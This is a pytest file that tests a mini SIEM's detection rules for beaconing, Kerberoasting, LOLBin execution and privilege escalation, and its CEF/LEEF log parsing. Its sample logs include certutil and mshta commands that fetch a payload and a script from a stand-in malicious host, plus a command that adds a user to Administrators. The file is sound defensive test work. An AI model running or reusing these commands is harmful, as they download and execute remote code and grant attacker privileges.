import pytest
from app.services.mini_siem import (
    analyze_logs_siem,
    calculate_beacon_jitter,
    compute_field_analytics,
    normalize_line,
)


def test_beacon_jitter_cadence():
    log_text = """2025-01-15T11:00:00Z web01 curl[5678]: HTTPS outbound to 51.15.0.100:443 (75B)
2025-01-15T11:05:00Z web01 curl[5679]: HTTPS outbound to 51.15.0.100:443 (82B)
2025-01-15T11:10:02Z web01 curl[5680]: HTTPS outbound to 51.15.0.100:443 (78B)
2025-01-15T11:15:01Z web01 curl[5681]: HTTPS outbound to 51.15.0.100:443 (80B)
2025-01-15T11:20:00Z web01 curl[5683]: HTTPS outbound to 51.15.0.100:443 (1.2KB)
2025-01-15T11:25:00Z web01 curl[5684]: HTTPS outbound to 51.15.0.100:443 (64KB)"""

    res = analyze_logs_siem(log_text)
    detections = res["detections"]
    rule_ids = [d["rule_id"] for d in detections]
    assert "C2_BEACONING_CADENCE_DETECTED" in rule_ids

    beacon_det = next(d for d in detections if d["rule_id"] == "C2_BEACONING_CADENCE_DETECTED")
    assert beacon_det["severity"] in ["high", "critical"]
    assert beacon_det["evidence"]["jitter_pct"] < 10.0
    assert beacon_det["evidence"]["is_beacon"] is True
    assert "T1071.001 Web Protocols" in beacon_det["mitre_candidates"]


def test_kerberoasting_detection():
    log_text = """LogName: Security
EventID: 4769
ServiceName: MSSQLSvc/sql01.corp.local:1433
TicketOptions: 0x40810000
TicketEncryptionType: 0x17
TargetUserName: svc_sql
ClientAddress: ::ffff:10.0.0.45"""

    res = analyze_logs_siem(log_text)
    detections = res["detections"]
    rule_ids = [d["rule_id"] for d in detections]
    assert "KERBEROASTING_TGS_REQUEST" in rule_ids

    kerb_det = next(d for d in detections if d["rule_id"] == "KERBEROASTING_TGS_REQUEST")
    assert "T1558.003 Kerberoasting" in kerb_det["mitre_candidates"]


def test_lolbin_execution_detection():
    log_text = """2025-01-15T12:00:00Z host01 cmd.exe: certutil.exe -urlcache -split -f http://malicious.ru/payload.exe C:\\temp\\payload.exe
2025-01-15T12:00:05Z host01 cmd.exe: mshta.exe http://malicious.ru/script.hta"""

    res = analyze_logs_siem(log_text)
    detections = res["detections"]
    rule_ids = [d["rule_id"] for d in detections]
    assert "LOLBIN_EXECUTION_CHAIN" in rule_ids

    lolbin_det = next(d for d in detections if d["rule_id"] == "LOLBIN_EXECUTION_CHAIN")
    assert any("T1218" in m or "T1105" in m for m in lolbin_det["mitre_candidates"])


def test_privilege_escalation_followthrough():
    log_text = """LogName: Security
EventID: 4672
AccountName: attacker01
Privileges: SeDebugPrivilege SeTcbPrivilege

LogName: Security
EventID: 4688
ProcessName: cmd.exe
CommandLine: net localgroup Administrators attacker01 /add"""

    res = analyze_logs_siem(log_text)
    detections = res["detections"]
    rule_ids = [d["rule_id"] for d in detections]
    assert "PRIVILEGE_ESCALATION_FOLLOWTHROUGH" in rule_ids

    priv_det = next(d for d in detections if d["rule_id"] == "PRIVILEGE_ESCALATION_FOLLOWTHROUGH")
    assert priv_det["severity"] == "critical"
    assert "T1078 Valid Accounts" in priv_det["mitre_candidates"]


def test_cef_and_leef_parsing():
    cef_line = "CEF:0|Check Point|VPN-1 & FireWall-1|98|drop|Drop|7|src=198.51.100.22 dst=10.0.0.10 spt=54321 dpt=22 suser=admin act=drop msg=Unauthorized SSH"
    event = normalize_line(cef_line, 1)
    assert event["source"] == "cef"
    assert event["source_ip"] == "198.51.100.22"
    assert event["destination_ip"] == "10.0.0.10"
    assert event["dest_port"] == 22
    assert event["user"] == "admin"
    assert event["severity"] == "high"

    leef_line = "LEEF:1.0|Microsoft|MSExchange|2013|EventLog|src=203.0.113.5\tdst=10.0.0.2\tusrName=bob"
    event2 = normalize_line(leef_line, 2)
    assert event2["source"] == "leef"
    assert event2["source_ip"] == "203.0.113.5"
    assert event2["destination_ip"] == "10.0.0.2"
    assert event2["user"] == "bob"


def test_field_analytics_computation():
    log_text = """src=10.0.0.1 dst=10.0.0.2 user=alice GET /index.html 200
src=10.0.0.1 dst=10.0.0.2 user=alice GET /login 200
src=10.0.0.5 dst=10.0.0.2 user=bob GET /admin 404"""

    res = analyze_logs_siem(log_text)
    analytics = res["metrics"]["field_analytics"]
    assert "source_ip" in analytics
    src_stats = analytics["source_ip"]
    assert src_stats["distinct_count"] >= 2
    assert src_stats["total_populated"] == 3
    assert src_stats["top_values"][0]["value"] == "10.0.0.1"
    assert src_stats["top_values"][0]["count"] == 2
    assert src_stats["top_values"][0]["percentage"] == pytest.approx(66.7, abs=0.1)
